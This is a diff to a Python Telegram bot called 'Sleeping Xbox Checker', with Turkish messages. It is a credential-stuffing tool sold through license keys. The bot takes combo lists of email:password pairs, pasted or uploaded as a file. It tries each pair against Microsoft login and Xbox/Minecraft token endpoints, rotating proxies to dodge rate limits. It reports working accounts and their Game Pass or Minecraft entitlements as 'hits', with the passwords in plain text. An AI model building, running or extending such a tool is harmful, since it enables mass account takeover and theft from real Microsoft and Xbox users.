@@ -21,8 +21,8 @@ USERS_FILE = "users.json"
 PROXIES_FILE = "proxies.txt"
 
 # Hafıza önbelleği
-user_sessions = {}  # Kullanıcı adımları takip etmek için
-active_tasks = {}   # Çalışan tarama işlemlerini durdurabilmek için
+user_sessions = {}  
+active_tasks = {}   
 
 # Dosyaları ilklendirme
 if not os.path.exists(KEYS_FILE):
@@ -32,7 +32,6 @@ if not os.path.exists(USERS_FILE):
 if not os.path.exists(PROXIES_FILE):
     with open(PROXIES_FILE, 'w') as f: f.write("")
 
-# Veri fonksiyonları
 def load_json(filename):
     with open(filename, 'r') as f: return json.load(f)
 
@@ -140,18 +139,15 @@ def admin_keyboard():
         types.InlineKeyboardButton("🔑 Key Oluştur", callback_data="adm_gen_key"),
         types.InlineKeyboardButton("📜 Keyleri Listele", callback_data="adm_list_keys"),
         types.InlineKeyboardButton("🌐 Proxy Ekle/Yönet", callback_data="adm_proxies"),
-        types.InlineKeyboardButton("📢 Duyuru Yap (Broadcast)", callback_data="adm_broadcast")
+        types.InlineKeyboardButton("📢 Duyuru Yap", callback_data="adm_broadcast")
     )
     return markup
 
 # --- CORE MANTIKSAL KONTROLLER ---
 def check_user_access(user_id):
     users = load_json(USERS_FILE)
-    if str(user_id) == str(ADMIN_ID):
-        return True
-    if str(user_id) in users:
-        if users[str(user_id)]["expiry"] > time.time():
-            return True
+    if str(user_id) == str(ADMIN_ID): return True
+    if str(user_id) in users and users[str(user_id)]["expiry"] > time.time(): return True
     return False
 
 @bot.message_handler(commands=['start'])
@@ -163,7 +159,7 @@ def start_cmd(message):
         welcome_text += "Erişiminiz aktif! Menüyü kullanarak tarama yapabilirsiniz."
         bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
     else:
-        welcome_text += "❌ Sistemi kullanmak için geçerli bir lisans anahtarınız (Key) olmalıdır.\n\nLütfen bir Key girin veya yöneticiden talep edin."
+        welcome_text += "❌ Sistemi kullanmak için geçerli bir lisans anahtarınız (Key) olmalıdır.\n\nLütfen bir Key girin:"
         user_sessions[user_id] = "waiting_for_key"
         bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
 
@@ -176,35 +172,23 @@ def process_key_activation(message):
 
     if input_key in keys and not keys[input_key]["used"]:
         duration = keys[input_key]["duration"]
-        expiry_time = time.time() + duration
-        
         keys[input_key]["used"] = True
         keys[input_key]["used_by"] = user_id
-        
-        users[str(user_id)] = {"expiry": expiry_time, "username": message.from_user.username}
-        
+        users[str(user_id)] = {"expiry": time.time() + duration, "username": message.from_user.username}
         save_json(KEYS_FILE, keys)
         save_json(USERS_FILE, users)
-        
         user_sessions[user_id] = None
         bot.send_message(message.chat.id, "✅ **Key Başarıyla Aktif Edildi!**\nSisteme tam erişiminiz sağlandı.", parse_mode="Markdown", reply_markup=main_keyboard(user_id))
     else:
-        bot.send_message(message.chat.id, "❌ Geçersiz veya daha önce kullanılmış bir Key girdiniz. Lütfen tekrar deneyin:")
+        bot.send_message(message.chat.id, "❌ Geçersiz veya kullanılmış Key. Tekrar deneyin:")
 
 @bot.message_handler(func=lambda msg: msg.text == "👤 Profilim")
 def profile_handler(message):
     user_id = message.from_user.id
     if not check_user_access(user_id): return
-    
     users = load_json(USERS_FILE)
-    if str(user_id) == str(ADMIN_ID):
-        expiry = "Sonsuz (Kurucu)"
-    else:
-        rem = users[str(user_id)]["expiry"] - time.time()
-        expiry = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"])) if rem > 0 else "Süresi Dolmuş"
-        
-    status_text = f"👤 **Kullanıcı Bilgileri:**\n\n🆔 **ID:** `{user_id}`\n⏳ **Lisans Bitiş:** `{expiry}`"
-    bot.send_message(message.chat.id, status_text, parse_mode="Markdown")
+    expiry = "Sonsuz (Kurucu)" if str(user_id) == str(ADMIN_ID) else time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"]))
+    bot.send_message(message.chat.id, f"👤 **Kullanıcı Bilgileri:**\n\n🆔 **ID:** `{user_id}`\n⏳ **Lisans Bitiş:** `{expiry}`", parse_mode="Markdown")
 
 # --- ADMIN PANELİ VE MODÜLLERİ ---
 @bot.message_handler(func=lambda msg: msg.text == "👑 Admin Paneli" and msg.from_user.id == ADMIN_ID)
@@ -214,145 +198,111 @@ def admin_panel(message):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
 def admin_callbacks(call):
     if call.from_user.id != ADMIN_ID: return
-    
     if call.data == "adm_gen_key":
         markup = types.InlineKeyboardMarkup()
-        markup.add(
-            types.InlineKeyboardButton("1 Günlük", callback_data="key_86400"),
-            types.InlineKeyboardButton("7 Günlük", callback_data="key_604800"),
-            types.InlineKeyboardButton("30 Günlük", callback_data="key_2592000")
-        )
-        bot.edit_message_text("Oluşturulacak Key süresini seçin:", call.message.chat.id, call.message.message_id, reply_markup=markup)
-        
+        markup.add(types.InlineKeyboardButton("1 Gün", callback_data="key_86400"), types.InlineKeyboardButton("7 Gün", callback_data="key_604800"), types.InlineKeyboardButton("30 Gün", callback_data="key_2592000"))
+        bot.edit_message_text("Süre seçin:", call.message.chat.id, call.message.message_id, reply_markup=markup)
     elif call.data == "adm_list_keys":
         keys = load_json(KEYS_FILE)
-        if not keys:
-            bot.answer_callback_query(call.id, "Hiç key oluşturulmamış.")
-            return
-        text = "📜 **Sistemdeki Anahtarlar:**\n\n"
-        for k, v in keys.items():
-            dur_days = v['duration'] // 86400
-            status = f"✅ Kullanılmadı ({dur_days} Gün)" if not v['used'] else f"❌ {v['used_by']} tarafından kullanıldı"
-            text += f"`{k}` -> {status}\n"
-        bot.edit_message_text(text[:4000], call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-
+        text = "📜 **Anahtarlar:**\n\n" + "".join([f"`{k}` -> {'Kullanıldı' if v['used'] else 'Boş'}\n" for k, v in keys.items()])
+        bot.edit_message_text(text[:4000] if text != "📜 **Anahtarlar:**\n\n" else "Hiç key yok.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
     elif call.data == "adm_proxies":
-        proxies = load_proxies()
-        text = f"🌐 **Proxy Yönetimi**\n\nMevcut yüklü proxy sayısı: `{len(proxies)}`"
-        markup = types.InlineKeyboardMarkup()
-        markup.add(
-            types.InlineKeyboardButton("➕ Proxy Yükle", callback_data="prox_add"),
-            types.InlineKeyboardButton("🗑️ Tümünü Sil", callback_data="prox_clear")
-        )
-        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
-
-    elif call.data == "adm_broadcast":
-        user_sessions[call.from_user.id] = "waiting_broadcast"
-        bot.send_message(call.message.chat.id, "📢 Göndermek istediğiniz duyuru mesajını yazın (Metin, fotoğraf veya markdown destekler):")
+        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("➕ Ekle", callback_data="prox_add"), types.InlineKeyboardButton("🗑️ Temizle", callback_data="prox_clear"))
+        bot.edit_message_text(f"🌐 **Proxy Yöneticisi**\nYüklü: `{len(load_proxies())}`", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("key_"))
 def process_key_generation(call):
-    duration = int(call.data.split("_")[1])
-    generated_key = f"SLEEPING-{str(uuid.uuid4())[:8].upper()}-{str(uuid.uuid4())[24:].upper()}"
-    
+    dur = int(call.data.split("_")[1])
+    gen_key = f"SLEEPING-{str(uuid.uuid4())[:8].upper()}-{str(uuid.uuid4())[24:].upper()}"
     keys = load_json(KEYS_FILE)
-    keys[generated_key] = {"duration": duration, "used": False, "used_by": None}
+    keys[gen_key] = {"duration": dur, "used": False, "used_by": None}
     save_json(KEYS_FILE, keys)
-    
-    bot.edit_message_text(f"🔑 **Yeni Key Başarıyla Üretildi:**\n\n`{generated_key}`\n\nSüre: {duration // 86400} Gün", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    bot.edit_message_text(f"🔑 **Üretildi:**\n`{gen_key}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("prox_"))
 def proxy_actions(call):
     if call.data == "prox_add":
         user_sessions[call.from_user.id] = "waiting_proxies"
-        bot.send_message(call.message.chat.id, "📝 Proxyleri her satıra bir adet gelecek şekilde `ip:port` veya `ip:port:user:pass` formatında gönderin:")
+        bot.send_message(call.message.chat.id, "📝 Proxyleri yolla:")
     elif call.data == "prox_clear":
         with open(PROXIES_FILE, 'w') as f: f.write("")
-        bot.edit_message_text("🗑️ Tüm proxyler sistemden temizlendi.", call.message.chat.id, call.message.message_id)
+        bot.edit_message_text("🗑️ Temizlendi.", call.message.chat.id, call.message.message_id)
 
 @bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_proxies" and msg.from_user.id == ADMIN_ID)
 def save_incoming_proxies(message):
-    proxy_data = message.text.strip()
-    with open(PROXIES_FILE, 'a') as f:
-        f.write(proxy_data + "\n")
+    with open(PROXIES_FILE, 'a') as f: f.write(message.text.strip() + "\n")
     user_sessions[message.from_user.id] = None
-    proxies = load_proxies()
-    bot.send_message(message.chat.id, f"✅ Proxyler eklendi! Toplam güncel proxy sayısı: `{len(proxies)}`", parse_mode="Markdown")
+    bot.send_message(message.chat.id, f"✅ Proxyler eklendi! Toplam: `{len(load_proxies())}`", parse_mode="Markdown")
 
-@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_broadcast" and msg.from_user.id == ADMIN_ID)
-def execute_broadcast(message):
-    user_sessions[message.from_user.id] = None
-    users = load_json(USERS_FILE)
-    
-    success, failed = 0, 0
-    # Admini de ekle listenin içine garantilemek için
-    user_ids = list(users.keys())
-    if str(ADMIN_ID) not in user_ids: user_ids.append(str(ADMIN_ID))
-
-    bot.send_message(message.chat.id, "⚡ Duyuru gönderimi başladı...")
-    for uid in user_ids:
-        try:
-            bot.copy_message(chat_id=int(uid), from_chat_id=message.chat.id, message_id=message.message_id)
-            success += 1
-        except:
-            failed += 1
-    bot.send_message(message.chat.id, f"📢 **Duyuru Tamamlandı!**\n\n✅ Başarılı: `{success}`\n❌ Başarısız: `{failed}`", parse_mode="Markdown")
-
-# --- XBOX TARAYICI BAŞLATMA VE YÖNETİMİ ---
+# --- XBOX TARAYICI BAŞLATMA VE DOSYA OKUMA ---
 @bot.message_handler(func=lambda msg: msg.text == "🚀 Tarama Başlat")
 def start_checker_flow(message):
     if not check_user_access(message.from_user.id): return
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(
-        types.InlineKeyboardButton("🌐 Proxyli Mod", callback_data="mode_proxy"),
-        types.InlineKeyboardButton("📱 Proxyless Mod (Kendi IP'n)", callback_data="mode_proxyless")
+    markup = types.InlineKeyboardMarkup().add(
+        types.InlineKeyboardButton("🌐 Proxyli", callback_data="mode_proxy"),
+        types.InlineKeyboardButton("📱 Proxyless", callback_data="mode_proxyless")
     )
-    bot.send_message(message.chat.id, "🤖 Taramayı nasıl yürütmek istersiniz? Mod seçin:", reply_markup=markup)
+    bot.send_message(message.chat.id, "🤖 Mod seçin:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
 def select_mode_and_request_combos(call):
     user_id = call.from_user.id
     mode = "proxy" if call.data == "mode_proxy" else "proxyless"
-    
-    if mode == "proxy" and len(load_proxies()) == 0:
-        bot.answer_callback_query(call.id, "Sistemde yüklü proxy yok! Lütfen Proxyless mod seçin veya adminin yüklemesini bekleyin.", show_alert=True)
+    if mode == "proxy" and not load_proxies():
+        bot.answer_callback_query(call.id, "Proxy yok! Adminin yüklemesi lazım.", show_alert=True)
         return
-        
     user_sessions[user_id] = {"mode": mode, "step": "waiting_combos"}
-    bot.edit_message_text(f"📂 **Mod Seçildi:** `{mode.upper()}`\n\nLütfen hesap listenizi `email:şifre` formatında her satıra bir adet olacak şekilde metin (text) olarak buraya yapıştırın veya yollayın:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    bot.edit_message_text(f"📂 Mod: `{mode.upper()}`\n\nComboları **.txt dosyası** olarak gönder veya buraya yapıştır:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
 
-@bot.message_handler(func=lambda msg: isinstance(user_sessions.get(msg.from_user.id), dict) and user_sessions[msg.from_user.id].get("step") == "waiting_combos")
+# Hem text hem de document(dosya) için çalışan ana dinleyici
+@bot.message_handler(content_types=['text', 'document'], func=lambda msg: isinstance(user_sessions.get(msg.from_user.id), dict) and user_sessions[msg.from_user.id].get("step") == "waiting_combos")
 def process_combos_and_run(message):
     user_id = message.from_user.id
     mode = user_sessions[user_id]["mode"]
     
-    combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
+    combos = []
+    
+    # EĞER DOSYA ATTIYSA İNDİR VE OKU
+    if message.document:
+        try:
+            bot.send_message(message.chat.id, "📥 Dosya indiriliyor, hesaplar çıkarılıyor...")
+            file_info = bot.get_file(message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            # Binary veriyi stringe çevir ve parçala
+            raw_text = downloaded_file.decode('utf-8', errors='ignore')
+            combos = [line.strip() for line in raw_text.splitlines() if line.strip() and ":" in line]
+        except Exception as e:
+            bot.send_message(message.chat.id, f"❌ Dosya okunurken hata oluştu: {str(e)}")
+            return
+            
+    # EĞER NORMAL YAZI ATTIYSA
+    elif message.text:
+        combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
+
     if not combos:
-        bot.send_message(message.chat.id, "❌ Geçerli hesap formatı bulunamadı. Lütfen satır satır `email:şifre` ilettiğinizden emin olun.")
+        bot.send_message(message.chat.id, "❌ İçinde geçerli `email:şifre` formatı bulunan bir hesap bulunamadı.")
         return
 
     user_sessions[user_id] = None
-    bot.send_message(message.chat.id, f"⏳ {len(combos)} adet hesap doğrulama kuyruğuna alındı. İşlem başlatılıyor...")
+    bot.send_message(message.chat.id, f"🔥 `{len(combos)}` adet hesap tespit edildi. Vurucu tim harekete geçiyor...")
     
-    # Arka planda taramayı tetikle
     t = Thread(target=core_checker_worker, args=(user_id, combos, mode, message.chat.id))
     active_tasks[user_id] = True
     t.start()
 
-# --- ARKA PLAN ÇALIŞMA MOTORU (THREADS) ---
+# --- ARKA PLAN ÇALIŞMA MOTORU (DETAYLI STATS) ---
 def core_checker_worker(user_id, combos, mode, chat_id):
     proxies_list = load_proxies()
     proxy_index = 0
     
-    status_msg = bot.send_message(chat_id, "📊 **Durum Grafiği**\n\n⏳ Hazırlanıyor...", parse_mode="Markdown")
+    status_msg = bot.send_message(chat_id, "📊 **Sistem Hazırlanıyor...**", parse_mode="Markdown")
     
-    hits, bad, twofa, errors, checked = 0, 0, 0, 0, 0
+    # Detaylı Hit Sayacı
+    stats = {"xgpu": 0, "xgp": 0, "mc": 0, "other": 0, "bad": 0, "twofa": 0, "errors": 0, "checked": 0}
     total = len(combos)
     
     for combo in combos:
-        if user_id in active_tasks and not active_tasks[user_id]:
-            break # İptal edildiyse durdur
+        if user_id in active_tasks and not active_tasks[user_id]: break
             
         parts = combo.split(':')
         email = parts[0]
@@ -366,62 +316,59 @@ def core_checker_worker(user_id, combos, mode, chat_id):
             proxy_index += 1
             session.proxies = {"http": f"http://{p}", "https://{p}": f"http://{p}"}
             
-        checked += 1
+        stats["checked"] += 1
         
-        # 1. Aşama Sftag Alımı
         url_post, sftag = get_sftag(session)
         if not url_post or not sftag:
-            errors += 1
+            stats["errors"] += 1
         else:
-            # 2. Aşama Microsoft Login
             ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
-            
             if auth_status == "2fa":
-                twofa += 1
-                bot.send_message(chat_id, f"⚠️ **[2FA]** `{email}`", parse_mode="Markdown")
-            elif auth_status == "bad":
-                bad += 1
+                stats["twofa"] += 1
+                bot.send_message(chat_id, f"⚠️ **[2FA]** `{email}:{password}`", parse_mode="Markdown")
+            elif auth_status == "bad": stats["bad"] += 1
             elif auth_status == "success" and ms_token:
-                # 3. Aşama Xbox Token Alımı
                 xbox_token, uhs = get_xbox_token(session, ms_token)
                 if xbox_token and uhs:
-                    # 4. Aşama XSTS Token Alımı
                     xsts_token = get_xsts_token(session, xbox_token)
                     if xsts_token:
-                        # 5. Aşama Minecraft/Xbox Sorgusu
                         mc_token = get_minecraft_token(session, uhs, xsts_token)
                         if mc_token:
                             acc_type = check_minecraft_entitlements(session, mc_token)
                             if acc_type:
-                                hits += 1
-                                hit_text = f"🟢 **[HIT] XBOX HESABI BULUNDU!** 🟢\n\n📧 **E-posta:** `{email}`\n🔑 **Şifre:** `{password}`\n🎮 **Ürün/Tür:** `{acc_type}`"
+                                # Hesap türüne göre sayacı arttır
+                                if 'Ultimate' in acc_type: stats["xgpu"] += 1
+                                elif 'Game Pass' in acc_type: stats["xgp"] += 1
+                                elif 'Minecraft' in acc_type: stats["mc"] += 1
+                                else: stats["other"] += 1
+                                
+                                hit_text = f"🟢 **[HIT] BULDUM!** 🟢\n\n📧 **Hesap:** `{email}:{password}`\n🎮 **İçerik:** `{acc_type}`"
                                 bot.send_message(chat_id, hit_text, parse_mode="Markdown")
-                            else:
-                                bad += 1 # Paket yoksa boş hesap kabul edilir
-                        else: errors += 1
-                    else: errors += 1
-                else: errors += 1
-            else:
-                bad += 1
+                            else: stats["bad"] += 1
+                        else: stats["errors"] += 1
+                    else: stats["errors"] += 1
+                else: stats["errors"] += 1
+            else: stats["bad"] += 1
                 
-        # Her 3 hesapta bir veya sonda canlı arayüz tablosunu güncelle
-        if checked % 3 == 0 or checked == total:
-            progress_text = f"💤 **Sleeping Xbox Checker Canlı Rapor** 💤\n\n" \
-                            f"🔄 **İlerleme:** `{checked}/{total}`\n" \
-                            f"🟢 **Hit (Başarılı):** `{hits}`\n" \
-                            f"🔴 **Bad (Hatalı):** `{bad}`\n" \
-                            f"🟡 **2FA (Doğrulama):** `{twofa}`\n" \
-                            f"❌ **Hata (Proxy/Bağlantı):** `{errors}`"
-            try:
-                bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
+        # Tabloyu Canlı Güncelle (Her 5 hesapta bir, Telegram Rate Limit takılmamak için)
+        if stats["checked"] % 5 == 0 or stats["checked"] == total:
+            progress_text = (
+                f"💤 **Sleeping Xbox Checker Canlı Analiz** 💤\n\n"
+                f"🔄 **Taranan:** `{stats['checked']} / {total}`\n\n"
+                f"👑 **GamePass Ultimate:** `{stats['xgpu']}`\n"
+                f"🎮 **GamePass PC:** `{stats['xgp']}`\n"
+                f"⛏️ **Minecraft:** `{stats['mc']}`\n"
+                f"📦 **Diğer Hit:** `{stats['other']}`\n\n"
+                f"🔴 **Bad:** `{stats['bad']}` | 🟡 **2FA:** `{stats['twofa']}` | ❌ **Error:** `{stats['errors']}`"
+            )
+            try: bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
             except: pass
             
-        time.sleep(0.3) # Rate limit yememek için hafif bekleme
+        time.sleep(0.3)
         
-    bot.send_message(chat_id, f"🏁 **Tarama Tamamlandı!** Toplam `{total}` hesap taranıp sonuçlandırıldı.", reply_markup=main_keyboard(user_id))
+    bot.send_message(chat_id, f"🏁 **Av Bitti!** `{total}` hesabın tamamı parçalandı.", reply_markup=main_keyboard(user_id))
     if user_id in active_tasks: del active_tasks[user_id]
 
-# --- SİSTEMİ AYAĞA KALDIRMA ---
 if __name__ == '__main__':
-    print("[+] Sleeping Xbox Checker aktif edildi. Bot emirlerini bekliyor...")
+    print("[+] Sleeping Xbox Checker aktif. Kurallar yok, sınırlar yok. Emir bekleniyor...")
     bot.infinity_polling()
